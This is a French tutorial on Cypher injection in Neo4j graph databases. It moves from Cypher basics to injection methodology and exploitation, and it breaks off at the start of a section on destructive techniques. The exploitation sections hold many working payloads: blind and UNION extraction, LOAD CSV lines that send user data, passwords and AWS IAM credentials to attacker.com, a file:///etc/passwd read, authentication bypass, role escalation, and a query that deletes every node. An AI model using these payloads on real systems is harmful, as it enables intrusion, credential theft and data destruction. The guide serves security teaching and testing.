# CYPHER INJECTION

***

### <mark style="color:red;">1. Introduction Complète à Cypher</mark>

#### <mark style="color:green;">1.1 Qu'est-ce que Cypher ?</mark>

**Cypher** (OpenCypher Query Language) est un langage de requête déclaratif spécialement conçu pour les bases de données graphiques. Créé par Neo4j en 2011, il est devenu le standard pour interroger les données relationnelles complexes.

**Analogie Simple**

```
SQL : Bases de données relationnelles :: Cypher : Bases de données graphiques
```

#### <mark style="color:green;">1.2 Pourquoi Cypher Existe-t-il ?</mark>

Les bases de données traditionnelles excellent pour les données tabulaires, mais peinent avec les relations complexes :

```
❌ SQL Complexe pour les Relations :
SELECT u1.nom, u2.nom, u3.nom 
FROM utilisateurs u1
JOIN amities a1 ON u1.id = a1.user1
JOIN utilisateurs u2 ON a1.user2 = u2.id
JOIN amities a2 ON u2.id = a2.user1  
JOIN utilisateurs u3 ON a2.user2 = u3.id
WHERE u1.nom = 'Alice'

✅ Cypher Simple et Intuitif :
MATCH (alice:Utilisateur {nom:'Alice'})-[:AMI]->()-[:AMI]->(ami_d_ami)
RETURN ami_d_ami.nom
```

#### <mark style="color:green;">1.3 Écosystème Cypher</mark>

```
🏛️ Bases de Données Supportées :
├── Neo4j (le pionnier) 🥇
├── RedisGraph (performant)
├── Amazon Neptune (cloud AWS)
├── ArangoDB (multi-modèle)
├── SAP HANA Graph
└── Apache AGE (PostgreSQL extension)

🛠️ Outils Populaires :
├── BloodHound (sécurité Active Directory)
├── Neo4j Browser (interface web)
├── Neo4j Desktop (application)
└── Cypher Shell (ligne de commande)
```

#### <mark style="color:green;">1.4 Différences Fondamentales</mark>

| Aspect            | Base Relationnelle (SQL)          | Base Graphique (Cypher)      |
| ----------------- | --------------------------------- | ---------------------------- |
| **Modèle**        | Tables, lignes, colonnes          | Nœuds, relations, propriétés |
| **Relations**     | Foreign Keys + JOINs              | Relations natives directes   |
| **Traversée**     | JOINs multiples complexes         | Navigation naturelle         |
| **Performance**   | Dégradée avec relations complexes | Optimisée pour les graphes   |
| **Visualisation** | Tableaux 📊                       | Graphiques connectés 🕸️     |

***

### 2. Commandes Cypher Essentielles

#### 2.1 Structure Générale d'une Requête Cypher

```cypher
// Pattern général : VERBE (pattern) [WHERE condition] [RETURN result]

MATCH (n:Label {propriete: 'valeur'})-[r:RELATION]->(m:AutreLabel)
WHERE n.age > 25
RETURN n.nom, r.type, m.nom
ORDER BY n.nom
LIMIT 10
```

#### 2.2 MATCH - La Fondation de Cypher

**MATCH** est l'équivalent de **SELECT** en SQL, mais bien plus puissant :

```cypher
// 📖 Syntaxe de base
MATCH (variable:Label)
RETURN variable

// 🔍 Exemples concrets
MATCH (u:Utilisateur) 
RETURN u.nom, u.email

MATCH (u:Utilisateur {nom: 'Alice'}) 
RETURN u

// 🕸️ Relations simples  
MATCH (u:Utilisateur)-[:SUIT]->(autre:Utilisateur)
RETURN u.nom AS suiveur, autre.nom AS suivi

// 🌐 Relations complexes (amis d'amis)
MATCH (moi:Utilisateur {nom:'Bob'})-[:AMI*2]->(ami_d_ami)
RETURN ami_d_ami.nom

// 🎯 Chemins variables (1 à 3 niveaux)
MATCH (start)-[:CONNECTE*1..3]->(end)
WHERE start.nom = 'Alice'
RETURN end.nom

// 🔄 Chemins bidirectionnels
MATCH (a)-[:AMI]-(b)  // Sans direction
WHERE a.nom = 'Charlie'
RETURN b.nom
```

**Patterns Avancés MATCH**

```cypher
// 🔗 Relations multiples
MATCH (u:Utilisateur)-[:SUIT]->(suivi)-[:POSTE]->(post:Article)
WHERE u.nom = 'Alice'
RETURN post.titre

// ⭐ Relations optionnelles (LEFT JOIN équivalent)
MATCH (u:Utilisateur)
OPTIONAL MATCH (u)-[:A_ECRIT]->(article:Article)
RETURN u.nom, article.titre

// 🚫 Relations négatives (n'ont PAS de relation)
MATCH (u:Utilisateur)
WHERE NOT (u)-[:BLOQUE]->(:Utilisateur {nom: 'Spam'})
RETURN u.nom
```

#### 2.3 CREATE - Création de Données

```cypher
// 👤 Créer un nœud simple
CREATE (u:Utilisateur {nom: 'Marie', age: 28, email: 'marie@email.com'})

// 👥 Créer plusieurs nœuds
CREATE 
  (alice:Utilisateur {nom: 'Alice'}),
  (bob:Utilisateur {nom: 'Bob'}),
  (charlie:Utilisateur {nom: 'Charlie'})

// 🔗 Créer avec relations
CREATE 
  (alice:Utilisateur {nom: 'Alice'})-[:AMI]->(bob:Utilisateur {nom: 'Bob'}),
  (bob)-[:AMI]->(alice)

// 📝 Créer et retourner
CREATE (u:Utilisateur {nom: 'Diana'})
RETURN u.nom + ' créé avec succès' AS message

// 🏷️ Labels multiples
CREATE (admin:Utilisateur:Administrateur {nom: 'Admin', niveau: 10})
```

#### 2.4 SET - Mise à Jour de Propriétés

```cypher
// ✏️ Mettre à jour une propriété
MATCH (u:Utilisateur {nom: 'Alice'})
SET u.age = 29
RETURN u

// 📝 Ajouter plusieurs propriétés
MATCH (u:Utilisateur {nom: 'Bob'})
SET u.email = 'bob@email.com', u.statut = 'actif', u.derniere_connexion = datetime()

// 🏷️ Ajouter un label
MATCH (u:Utilisateur {nom: 'Charlie'})
SET u:Premium

// 📋 Remplacer toutes les propriétés
MATCH (u:Utilisateur {nom: 'Diana'})
SET u = {nom: 'Diana Smith', age: 35, ville: 'Paris'}

// ➕ Ajouter des propriétés depuis un map
MATCH (u:Utilisateur {nom: 'Eve'})
SET u += {telephone: '123456789', profession: 'Développeuse'}

// 🔄 Mise à jour conditionnelle
MATCH (u:Utilisateur)
WHERE u.age < 18
SET u.statut = 'mineur'
```

#### 2.5 DELETE et DETACH DELETE - Suppression

```cypher
// 🗑️ Supprimer un nœud (sans relations)
MATCH (u:Utilisateur {nom: 'TestUser'})
DELETE u

// 🔗💥 Supprimer nœud ET ses relations
MATCH (u:Utilisateur {nom: 'UserASupprimer'})
DETACH DELETE u

// 🚫 Supprimer juste une relation
MATCH (a:Utilisateur {nom: 'Alice'})-[r:AMI]-(b:Utilisateur {nom: 'Bob'})
DELETE r

// 🧹 Suppression en masse avec condition
MATCH (u:Utilisateur)
WHERE u.derniere_connexion < datetime() - duration('P6M')  // 6 mois
DETACH DELETE u

// ⚠️ DANGER : Supprimer TOUT (à ne JAMAIS faire en production!)
MATCH (n) DETACH DELETE n
```

#### 2.6 UNION - Combiner des Résultats

```cypher
// 🔄 UNION standard (sans doublons)
MATCH (u:Utilisateur {ville: 'Paris'})
RETURN u.nom AS nom
UNION
MATCH (u:Utilisateur {ville: 'Lyon'})  
RETURN u.nom AS nom

// 🔄➕ UNION ALL (avec doublons)
MATCH (u:Utilisateur)-[:SUIT]->(autre)
RETURN autre.nom AS influence
UNION ALL
MATCH (u:Utilisateur)-[:AMI]->(ami)
RETURN ami.nom AS influence

// 📊 Types de données différents (permis en Cypher)
MATCH (u:Utilisateur)
RETURN u.nom AS result
UNION
MATCH (p:Produit)
RETURN p.prix AS result  // String + Number = OK

// 🏷️ UNION avec labels différents
MATCH (admin:Administrateur)
RETURN admin.nom AS nom, 'Admin' AS type
UNION
MATCH (user:Utilisateur)  
RETURN user.nom AS nom, 'User' AS type
```

#### 2.7 WITH - Chaînage de Requêtes

```cypher
// 🔗 Chaînage simple
MATCH (u:Utilisateur)
WITH u
ORDER BY u.nom
LIMIT 5
RETURN collect(u.nom) AS top_users

// 📊 Agrégation puis filtrage
MATCH (u:Utilisateur)-[:A_ECRIT]->(post:Article)
WITH u, count(post) AS nb_posts
WHERE nb_posts > 10
RETURN u.nom, nb_posts

// 🎯 Transformation de données
MATCH (u:Utilisateur)
WITH u, split(u.nom_complet, ' ') AS parties_nom
RETURN u.email, parties_nom[0] AS prenom, parties_nom[1] AS nom

// 🔄 Requêtes complexes multi-étapes
MATCH (u:Utilisateur {nom: 'Alice'})
WITH u
MATCH (u)-[:AMI]->(ami)
WITH u, collect(ami) AS amis
MATCH (u)-[:SUIT]->(suivi)
WITH u, amis, collect(suivi) AS suivis
RETURN u.nom, size(amis) AS nb_amis, size(suivis) AS nb_suivis
```

#### 2.8 WHERE - Filtrage Avancé

```cypher
// 🎯 Conditions de base
MATCH (u:Utilisateur)
WHERE u.age >= 18 AND u.age <= 65
RETURN u.nom

// 🔍 Recherche textuelle
MATCH (u:Utilisateur)
WHERE u.nom STARTS WITH 'A' OR u.nom ENDS WITH 'son'
RETURN u.nom

// 📝 Expressions régulières
MATCH (u:Utilisateur)  
WHERE u.email =~ '.*@gmail\\.com$'
RETURN u.nom, u.email

// 📋 Appartenance à une liste
MATCH (u:Utilisateur)
WHERE u.ville IN ['Paris', 'Lyon', 'Marseille']
RETURN u.nom, u.ville

// 🕸️ Conditions sur les relations
MATCH (u:Utilisateur)-[r:AMI]->(ami)
WHERE r.depuis < date('2020-01-01')
RETURN u.nom, ami.nom, r.depuis

// 🚫 Conditions négatives
MATCH (u:Utilisateur)
WHERE NOT (u)-[:BLOQUE]->()
AND NOT u.nom IS NULL
RETURN u.nom

// 🔢 Conditions sur collections
MATCH (u:Utilisateur)
WHERE size((u)-[:AMI]->()) > 5  // Plus de 5 amis
RETURN u.nom
```

#### 2.9 ORDER BY et LIMIT - Tri et Pagination

```cypher
// 📈 Tri croissant
MATCH (u:Utilisateur)
RETURN u.nom
ORDER BY u.nom ASC

// 📉 Tri décroissant
MATCH (u:Utilisateur)  
RETURN u.nom, u.age
ORDER BY u.age DESC

// 🎯 Tri multiple
MATCH (u:Utilisateur)
RETURN u.nom, u.ville, u.age
ORDER BY u.ville ASC, u.age DESC

// 📄 Pagination
MATCH (u:Utilisateur)
RETURN u.nom
ORDER BY u.nom
SKIP 20 LIMIT 10  // Page 3 (10 par page)

// 🔝 Top N
MATCH (u:Utilisateur)-[:A_ECRIT]->(post:Article)
WITH u, count(post) AS nb_posts
RETURN u.nom, nb_posts
ORDER BY nb_posts DESC
LIMIT 5  // Top 5 auteurs
```

#### 2.10 Fonctions d'Agrégation

```cypher
// 🔢 Fonctions de base
MATCH (u:Utilisateur)
RETURN 
  count(u) AS total_users,
  avg(u.age) AS age_moyen,
  min(u.age) AS age_min,
  max(u.age) AS age_max,
  sum(u.points) AS total_points

// 📋 Collecte de données
MATCH (u:Utilisateur {ville: 'Paris'})
RETURN collect(u.nom) AS parisiens

// 📊 Collecte avec DISTINCT
MATCH (u:Utilisateur)-[:HABITE]->(ville:Ville)
RETURN collect(DISTINCT ville.nom) AS villes_representees

// 🎲 Échantillonnage
MATCH (u:Utilisateur)
RETURN collect(u.nom)[..5] AS echantillon_5_users
```

***

### 3. Visualisation des Bases de Données Graphiques

#### 3.1 Représentation Visuelle vs Tabulaire

```
📊 BASE RELATIONNELLE (SQL) :

Table: utilisateurs
+----+--------+----------+-------+
| id | nom    | email    | ville |  
+----+--------+----------+-------+
| 1  | Alice  | a@e.com  | Paris |
| 2  | Bob    | b@e.com  | Lyon  |
+----+--------+----------+-------+

Table: amities  
+-----+---------+---------+
| id  | user1   | user2   |
+-----+---------+---------+
| 1   | 1       | 2       |
+-----+---------+---------+

🕸️ BASE GRAPHIQUE (Cypher) :

    (Alice:Utilisateur)──[AMI]──>(Bob:Utilisateur)
    {nom:"Alice"              {nom:"Bob"
     email:"a@e.com"           email:"b@e.com"  
     ville:"Paris"}            ville:"Lyon"}
```

#### 3.2 Exemples de Structures Graphiques

**Réseau Social**

```
       (Alice)─[AMI]─(Bob)─[AMI]─(Charlie)
          │                       │
       [SUIT]                  [SUIT]  
          │                       │
          ▼                       ▼
      (Diana)◄─[BLOQUE]─────(Eve)
```

**E-commerce**

```
(Utilisateur)─[COMMANDE]→(Commande)─[CONTIENT]→(Produit)
     │                       │              ↗
  [AJOUTE]                [LIVRE_A]      [DANS]
     │                       │         ↙
     ▼                       ▼    (Categorie)
(Panier)◄─[APPARTIENT]─(Adresse)
```

**Infrastructure IT (BloodHound)**

```
(User:Alice)─[MemberOf]→(Group:Admins)─[GenericAll]→(Computer:DC01)
     │                                                    ↑
  [HasSession]                                     [AdminTo]
     │                                                    │
     ▼                                              (User:Bob)
(Computer:WS01)
```

***

### 4. Comprendre les Injections Cypher

#### 4.1 Définition et Mécanisme

Une **injection Cypher** exploite la construction dynamique de requêtes en injectant du code malveillant dans les paramètres utilisateur.

**Processus d'Attaque**

```
1️⃣ Application vulnérable construit une requête dynamiquement
2️⃣ Attaquant injecte du code Cypher malveillant  
3️⃣ Base de données exécute le code injecté
4️⃣ Attaquant obtient accès non autorisé aux données
```

#### 4.2 Anatomie d'une Injection

**Code Vulnérable Typique**

```javascript
// ❌ VULNÉRABLE - Construction par concaténation
const nom = req.body.nom; // Input utilisateur non filtré
const requete = `MATCH (u:Utilisateur) WHERE u.nom = '${nom}' RETURN u`;
session.run(requete);

// ❌ VULNÉRABLE - Template strings
const id = req.params.id;
const requete = `MATCH (u:Utilisateur) WHERE id(u) = ${id} RETURN u`;
```

**Exploitation Étape par Étape**

```cypher
// 🎯 Requête Originale
MATCH (u:Utilisateur) WHERE u.nom = '[INPUT_UTILISATEUR]' RETURN u

// 💣 Input Malveillant
Alice' OR 1=1 RETURN u//

// 💥 Requête Finale Exécutée  
MATCH (u:Utilisateur) WHERE u.nom = 'Alice' OR 1=1 RETURN u//' RETURN u
                                    └─────┬─────┘
                                    Condition toujours vraie
                                    │
                            // Commente le reste ───┘
```

#### 4.3 Pourquoi Cypher est Particulièrement Vulnérable

```
🔗 Flexibilité des Clauses :
   SQL : Clauses fixes (SELECT, INSERT, UPDATE, DELETE)
   Cypher : Clauses chaînables librement

💪 Puissance du Langage :
   - LOAD CSV pour SSRF
   - APOC pour fonctions avancées  
   - Procédures système (db.labels, etc.)

🌐 Composition de Requêtes :
   Possibilité d'ajouter des clauses avec UNION, WITH, etc.
```

***

### 5. Types d'Injections Cypher

#### 5.1 Injection In-Band (Dans la Bande)

Les résultats malveillants sont directement visibles dans la réponse de l'application.

**🎯 Injection Simple**

```cypher
// Application : Recherche d'utilisateur
GET /users/search?name=Alice

// Code backend vulnérable
MATCH (u:Utilisateur) WHERE u.nom CONTAINS '${name}' RETURN u

// 💣 Payload d'attaque
name = Alice' OR 1=1 RETURN u//

// 💥 Requête exécutée
MATCH (u:Utilisateur) WHERE u.nom CONTAINS 'Alice' OR 1=1 RETURN u//' RETURN u
                                              └──┬──┘
                                         Retourne TOUS les utilisateurs
```

**🔗 Injection avec UNION**

```cypher
// Application : Profil utilisateur par ID  
GET /profile/42

// Code backend
MATCH (u:Utilisateur) WHERE id(u) = ${id} RETURN u.nom, u.email

// 💣 Payload sophistiqué
id = 42 RETURN "dummy" AS nom, "dummy" AS email UNION CALL db.labels() YIELD label AS nom, "system" AS email//

// 💥 Résultat : Récupération des labels de la base
[
  {"nom": "dummy", "email": "dummy"},
  {"nom": "Utilisateur", "email": "system"},  
  {"nom": "Produit", "email": "system"},
  {"nom": "Commande", "email": "system"}
]
```

**📊 Schéma In-Band**

```
[Client] ──(1) Payload malveillant──> [App Vulnérable]
                                           │
                                        (2) Requête injectée
                                           │
                                           ▼
[Client] <──(4) Données sensibles──── [Base Neo4j]
           │                              │
         (3) Réponse avec données      Exécution
```

#### 5.2 Injection Aveugle (Blind)

Aucun résultat direct, mais inférence possible via le comportement de l'application.

**🔍 Boolean-Based (Basée sur Booléens)**

```cypher
// Test de condition : Existe-t-il un admin ?
payload1 = ' AND EXISTS((u:Utilisateur {role:'admin'})) AND '1'='1
payload2 = ' AND EXISTS((u:Utilisateur {role:'superadmin'}))) AND '1'='1

// Si payload1 retourne des résultats et payload2 non,
// on sait qu'il y a un admin mais pas de superadmin
```

**⏰ Time-Based (Basée sur le Temps)**

```cypher
// Nécessite APOC installé
// Test : Le premier caractère du mot de passe admin est-il 'a' ?
' AND substring((u:Utilisateur {nom:'admin'}).password, 0, 1) = 'a' AND EXISTS((x) WHERE x=1 OR apoc.util.sleep(5000)) AND '1'='1

// Si la réponse met 5 secondes → première lettre = 'a'  
// Si réponse immédiate → première lettre ≠ 'a'
```

**📊 Schéma Blind**

```
[Client] ──(1) Tests logiques──> [App Vulnérable]
    ▲                                 │
    │                              (2) Requêtes conditionnelles  
    │                                 │
    │                                 ▼
(4) Analyse des réponses         [Base Neo4j]
    │                                 │  
    │                              (3) Comportement différentiel
[Attaquant]◄─────────────────────────┘
   (Inférence des données)
```

#### 5.3 Injection Out-of-Band

Exfiltration des données vers un serveur contrôlé par l'attaquant.

**🌐 Exfiltration LOAD CSV**

```cypher
// 🎯 Exfiltrer les labels
' CALL db.labels() YIELD label LOAD CSV FROM 'https://attacker.com/collect?data=' + label AS dummy RETURN dummy//

// Requêtes reçues sur attacker.com :
GET /collect?data=Utilisateur
GET /collect?data=Produit  
GET /collect?data=Commande
```

**📡 Exfiltration SSRF**

```cypher
// 🔓 Récupérer métadonnées AWS et les exfiltrer
' LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS creds LOAD CSV FROM 'https://attacker.com/aws?role=' + creds[0] AS dummy RETURN dummy//
```

**📊 Schéma Out-of-Band**

```
                   [App Vulnérable]
                        │
                   (1) Injection  
                        │
                        ▼
   [Serveur Attaquant] ←─── [Base Neo4j] 
         │                    │
      (3) Logs             (2) Requêtes d'exfiltration
      avec données          (LOAD CSV vers serveur externe)
         │
         ▼
    [Attaquant]
   (Analyse des données)
```

#### 5.4 Comparaison des Types

| Type              | Visibilité    | Complexité   | Détection    | Cas d'usage               |
| ----------------- | ------------- | ------------ | ------------ | ------------------------- |
| **In-Band**       | 👁️ Directe   | ⭐ Simple     | 🚨 Facile    | Tests initiaux            |
| **Boolean-Blind** | 🕵️ Inférence | ⭐⭐ Moyenne   | 🔍 Modérée   | Extraction précise        |
| **Time-Blind**    | ⏰ Temporelle  | ⭐⭐⭐ Complexe | 🔎 Difficile | Environnements restreints |
| **Out-of-Band**   | 📡 Externe    | ⭐⭐ Moyenne   | 🚨 Variable  | Exfiltration massive      |

***

### 6. Méthodologie de Test

#### 6.1 Cartographie des Points d'Entrée

**🎯 Zones à Auditer**

```
🔍 URLs avec Paramètres :
├── /users/{id}              ← IDs numériques  
├── /search?q={query}        ← Recherches textuelles
├── /filter?category={cat}   ← Filtres
└── /api/v1/data?param={p}   ← APIs REST

📝 Formulaires :
├── Connexion (username/password)
├── Inscription (tous les champs)  
├── Recherche avancée
└── Profils utilisateur (bio, description)

📡 Headers HTTP :
├── User-Agent
├── X-Forwarded-For
├── Referer  
└── Headers custom d'API
```

**🔬 Analyse du Code Source**

```javascript
// 🚩 Patterns suspects à chercher :
const patterns_vulnerables = [
  // Construction directe de requête
  `"MATCH (n) WHERE n.id = " + userInput`,
  
  // Template literals  
  `\`MATCH (n) WHERE n.name = '${nom}'\``,
  
  // Concaténation de string
  `requete += userInput`,
  
  // Interpolation directe
  `query.format(userInput)`
];
```

#### 6.2 Détection Systématique

**🔍 Phase 1 : Détection par Erreur**

```cypher
-- 🎯 Payloads de détection d'erreur
'                    -- Apostrophe simple
"                    -- Guillemet double  
)                    -- Parenthèse fermante
\                    -- Backslash
')))                 -- Parenthèses multiples
" OR "1"="1          -- Condition logique
' OR '1'='1          -- Condition logique alternative
12/0                 -- Division par zéro
42-'string'          -- Opération invalide  
randomstring123      -- Chaîne inexistante
```

**Exemple d'Erreur Neo4j :**

```json
{
  "errors": [{
    "code": "Neo.ClientError.Statement.SyntaxError",
    "message": "Invalid input ')': expected whitespace, comment or end of input (line 1, column 45)"
  }]
}
```

**🧮 Phase 2 : Validation par Opérations Mathématiques**

```
🔢 Tests d'opérations :
Original: /api/user/42
Tests:
├── /api/user/41+1          (doit donner même résultat)
├── /api/user/84/2          (division)  
├── /api/user/6*7           (multiplication)
└── /api/user/50-8          (soustraction)

✅ Si résultats identiques → Injection probable
❌ Si erreur/résultats différents → Protection en place
```

**🔍 Phase 3 : Tests Boolean**

```cypher
-- 🎯 Payloads boolean systematiques
' OR 1=1 //                 -- Condition toujours vraie
' OR 1=0 //                 -- Condition toujours fausse
' AND 1=1 //                -- ET logique vrai
' AND 1=0 //                -- ET logique faux
" OR "x"="x //              -- Avec guillemets doubles
' OR TRUE //                -- Boolean explicite
' OR FALSE //               -- Boolean explicite faux
```

#### 6.3 Contexte d'Injection et Échappement

**🧩 Analyse du Contexte d'Injection**

```cypher
-- 🎯 Dans une chaîne de caractères
MATCH (u:Utilisateur) WHERE u.nom = '[INJECTION_ICI]' RETURN u
Échappement nécessaire : '

-- 🎯 Dans un nombre  
MATCH (u:Utilisateur) WHERE u.id = [INJECTION_ICI] RETURN u
Échappement nécessaire : aucun

-- 🎯 Dans une propriété d'objet
MATCH (u:Utilisateur {nom: '[INJECTION_ICI]'}) RETURN u  
Échappement nécessaire : '})

-- 🎯 Dans une clause WHERE complexe
MATCH (u) WHERE u.nom = '[INJECTION_ICI]' AND u.actif = true RETURN u
Échappement nécessaire : ' AND
```

**🛠️ Techniques d'Échappement**

```cypher
-- 🔓 Sortir d'une chaîne simple
Original: MATCH (u) WHERE u.nom = 'USER_INPUT' RETURN u
Payload: Alice' OR 1=1 RETURN u//
Final: MATCH (u) WHERE u.nom = 'Alice' OR 1=1 RETURN u//' RETURN u

-- 🔓 Sortir d'un objet de propriétés
Original: MATCH (u:Utilisateur {nom: 'USER_INPUT'}) RETURN u  
Payload: Alice'}) OR 1=1 WITH u MATCH (all) RETURN all//
Final: MATCH (u:Utilisateur {nom: 'Alice'}) OR 1=1 WITH u MATCH (all) RETURN all//'}) RETURN u

-- 🔓 Technique "WITH AS" pour les clauses CREATE
Original: CREATE (n:Person) SET n.name="USER_INPUT" RETURN n
Payload: test" WITH 1337 AS dummy MATCH (n) DETACH DELETE n//
Final: CREATE (n:Person) SET n.name="test" WITH 1337 AS dummy MATCH (n) DETACH DELETE n//" RETURN n
```

**💬 Gestion des Commentaires**

```cypher
-- 📝 Commentaires inline (//) 
' OR 1=1 RETURN u//          -- Commente tout ce qui suit
' OR 1=1 RETURN u-- test     -- Équivalent SQL (ne marche pas en Cypher)

-- 📝 Commentaires multi-lignes (/* */)
' OR 1=1 RETURN u/*          -- Début de commentaire multi-ligne  
                            -- S'arrête au premier */ rencontré

-- 🎯 Contournement de LIMIT avec commentaires
Original: MATCH (u) WHERE u.nom = 'INPUT' RETURN u LIMIT 0
Payload: test' OR 1=1 RETURN u//
Final: MATCH (u) WHERE u.nom = 'test' OR 1=1 RETURN u// RETURN u LIMIT 0
```

#### 6.4 Outils et Automation

**🔧 Outils Spécialisés**

```bash
# 🎯 Cypher Injection Scanner (Burp Extension)
# Installation via BApp Store dans Burp Suite Pro

# 🕷️ sqlmap adaptation pour Cypher (expérimental)
python sqlmap.py -u "http://target.com/api/user/1*" --technique=B --dbms=neo4j

# 🔍 Tests manuels avec curl
curl -X GET "http://target.com/api/users/search?name=test%27%20OR%201%3D1%20RETURN%20u%2F%2F"
```

**🤖 Script de Détection Automatisée**

```python
#!/usr/bin/env python3
import requests
import time

class CypherInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.payloads = [
            "'",
            '"',
            ")",
            "' OR 1=1 //",
            "' AND 1=2 //", 
            "42+1-1",
            "84/2",
            "randomstring123"
        ]
    
    def test_endpoint(self, endpoint, param):
        results = {}
        
        # Test baseline
        normal_response = requests.get(f"{self.base_url}{endpoint}?{param}=test")
        baseline_time = normal_response.elapsed.total_seconds()
        
        for payload in self.payloads:
            try:
                start_time = time.time()
                response = requests.get(f"{self.base_url}{endpoint}?{param}={payload}")
                response_time = time.time() - start_time
                
                results[payload] = {
                    'status': response.status_code,
                    'length': len(response.text),
                    'time': response_time,
                    'error_detected': 'Neo.ClientError' in response.text
                }
            except Exception as e:
                results[payload] = {'error': str(e)}
        
        return results

# Usage
tester = CypherInjectionTester("https://target.com")
results = tester.test_endpoint("/api/search", "query")
```

***

### 7. Techniques d'Exploitation

#### 7.1 Reconnaissance de la Base de Données

**🕵️ Fingerprinting de la Base**

```cypher
-- 🎯 Identifier le type de base graphique
' RETURN "test" UNION CALL dbms.components() YIELD name, versions //
-- Neo4j retournera ses composants

-- 🔍 Version Neo4j
' RETURN "test" UNION CALL dbms.info() YIELD name, value //

-- 📊 Informations système
' RETURN "test" UNION SHOW databases YIELD name //
```

**🗂️ Énumération des Métadonnées**

```cypher
-- 📋 Lister tous les labels
Method 1: ' UNION CALL db.labels() YIELD label AS result //
Method 2: ' UNION MATCH (n) RETURN DISTINCT labels(n) AS result //
Method 3: ' UNION RETURN [label IN db.labels() | label] AS result //

-- 🔑 Lister les propriétés d'un label
MATCH (u:Utilisateur) RETURN DISTINCT keys(u) AS proprietes //

-- 📊 Compter les nœuds par label
MATCH (n) RETURN labels(n) AS label, count(*) AS count //

-- 🔗 Énumérer les types de relations
CALL db.relationshipTypes() YIELD relationshipType AS result //

-- 👥 Lister les utilisateurs de la base
SHOW USERS YIELD user AS result //

-- 🛡️ Lister les rôles
SHOW ROLES YIELD role AS result //
```

#### 7.2 Exfiltration de Données Avancée

**📤 Méthodes In-Band**

```cypher
-- 📊 Exfiltration basique
' UNION MATCH (u:Utilisateur) RETURN u.nom AS result //

-- 🔗 Agrégation pour éviter les limites de résultats  
' UNION MATCH (u:Utilisateur) RETURN collect(u.nom) AS result //

-- 📋 Données structurées
' UNION MATCH (u:Utilisateur) RETURN {nom: u.nom, email: u.email, role: u.role} AS result //

-- 🔢 Exfiltration avec numérotation
' UNION MATCH (u:Utilisateur) WITH u, id(u) AS uid RETURN uid + ': ' + u.nom AS result //
```

**🌐 Méthodes Out-of-Band**

```cypher
-- 📡 Exfiltration LOAD CSV basique
' CALL db.labels() YIELD label LOAD CSV FROM 'https://attacker.com/' + label AS r RETURN r //

-- 📦 Exfiltration de données utilisateur
' MATCH (u:Utilisateur) LOAD CSV FROM 'https://attacker.com/user/' + u.nom + '/' + u.email AS r RETURN r //

-- 🔐 Exfiltration de mots de passe (si stockés)  
' MATCH (u:Utilisateur) WHERE u.password IS NOT NULL LOAD CSV FROM 'https://attacker.com/pwd/' + u.nom + '/' + u.password AS r RETURN r //

-- 📊 Exfiltration avec encodage (contournement de caractères spéciaux)
' MATCH (u:Utilisateur) WITH apoc.text.base64Encode(u.nom + '|' + u.email) AS encoded LOAD CSV FROM 'https://attacker.com/b64/' + encoded AS r RETURN r //
```

#### 7.3 Server-Side Request Forgery (SSRF)

**☁️ Métadonnées Cloud (AWS)**

```cypher
-- 🔍 Reconnaissance métadonnées AWS
' LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS meta WITH meta[0] AS endpoint LOAD CSV FROM 'https://attacker.com/aws/meta/' + endpoint AS r RETURN r //

-- 🔑 Récupération des credentials IAM
' LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' AS roles WITH roles[0] AS role LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role AS creds LOAD CSV FROM 'https://attacker.com/aws/creds/' + creds[0] AS r RETURN r //

-- 🏷️ Instance metadata
' LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/instance-id' AS instance LOAD CSV FROM 'https://attacker.com/aws/instance/' + instance[0] AS r RETURN r //
```

**🔍 Reconnaissance Interne**

```cypher
-- 🌐 Scan de ports internes (via timing)
' LOAD CSV FROM 'http://192.168.1.1:22' AS r RETURN r //     -- SSH
' LOAD CSV FROM 'http://192.168.1.1:3389' AS r RETURN r //   -- RDP  
' LOAD CSV FROM 'http://192.168.1.1:80' AS r RETURN r //     -- HTTP
' LOAD CSV FROM 'http://localhost:8080/admin' AS r RETURN r // -- Interface admin

-- 📁 Accès aux endpoints internes
' LOAD CSV FROM 'http://internal-api.company.com/api/users' AS users LOAD CSV FROM 'https://attacker.com/internal-api/' + users[0] AS r RETURN r //

-- 🗂️ Lecture de fichiers via file://
' LOAD CSV FROM 'file:///etc/passwd' AS passwd LOAD CSV FROM 'https://attacker.com/files/' + passwd[0] AS r RETURN r //
```

#### 7.4 Bypass d'Authentification

**🔓 Techniques Classiques**

```cypher
-- 🎯 Bypass login simple
Original: MATCH (u:User) WHERE u.username = 'admin' AND u.password = 'USER_INPUT' RETURN u
Payload: ' OR 1=1 RETURN u //
Final: MATCH (u:User) WHERE u.username = 'admin' AND u.password = '' OR 1=1 RETURN u //' RETURN u

-- 🔑 Bypass avec condition utilisateur
Original: MATCH (u:User) WHERE u.email = 'USER_EMAIL' AND u.password = 'USER_PASSWORD' RETURN u  
Payload email: admin@company.com' OR u.role = 'admin' WITH u MATCH (admin:User) WHERE admin.role = 'admin' RETURN admin //
```

**🎭 Usurpation d'Identité**

```cypher
-- 👑 Récupération compte admin
' UNION MATCH (admin:User) WHERE admin.role = 'admin' RETURN admin AS u //

-- 🔓 Bypass multi-facteurs (si token stocké en base)
' UNION MATCH (u:User)-[:HAS_TOKEN]->(token:MFAToken) WHERE token.valid = true RETURN u //
```

#### 7.5 Élévation de Privilèges

**📈 Modification de Rôles**

```cypher
-- 🎯 Dans une requête CREATE vulnérable
Original: CREATE (u:User) SET u.name = 'USER_INPUT', u.role = 'user' RETURN u
Payload: test", u.role = "admin" RETURN u //
Final: CREATE (u:User) SET u.name = "test", u.role = "admin" RETURN u //', u.role = 'user' RETURN u

-- 🔧 Modification post-création avec WITH
Original: CREATE (u:User) SET u.name = 'USER_INPUT' RETURN u
Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
```

**🛡️ Contournement RBAC**

```cypher
-- 🔍 Énumération des permissions
' UNION CALL dbms.security.listRoles() YIELD role, users RETURN role + ': ' + toString(users) AS result //

-- 👥 Ajout à un groupe privilégié  
' UNION CALL dbms.security.addRoleToUser('admin', 'current_user') YIELD user RETURN user //
```

#### 7.6 Techniques Destructives (⚠️ DANGER)

**💥 Suppression de Données**

```cypher
-- ⚠️ Suppression d'un utilisateur spécifique
